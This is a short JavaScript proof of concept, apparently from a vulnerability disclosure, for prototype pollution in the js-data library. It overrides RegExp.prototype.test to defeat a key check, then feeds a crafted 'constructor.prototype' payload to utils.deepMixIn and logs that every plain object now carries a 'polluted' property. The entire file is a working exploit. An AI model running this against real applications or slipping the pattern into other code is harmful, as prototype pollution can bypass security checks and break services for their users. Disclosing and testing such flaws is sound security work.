RegExp.prototype.test = () => false;
console.log({}.polluted);
const {utils} = require('js-data');
const source = JSON.parse('{"constructor.prototype": {"polluted":"yes"}}');
utils.deepMixIn({}, source);
console.log({}.polluted);